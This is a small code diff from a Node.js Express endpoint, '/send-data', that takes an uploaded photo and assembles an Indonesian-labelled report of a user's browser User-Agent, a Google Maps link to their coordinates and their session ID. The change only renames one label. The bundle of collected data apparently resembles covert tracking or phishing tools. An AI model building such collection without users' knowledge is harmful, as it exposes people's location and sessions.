@@ -80,7 +80,7 @@ app.post("/send-data", upload.single("photo"), async (req, res) => {
         **Data Pengguna:**
         - User-Agent: ${userAgent}
         - Lokasi: https://www.google.com/maps?q=${latitude},${longitude}
-        - Sesi: ${session}
+        - Sesi ID: ${session}
         `;
 
         
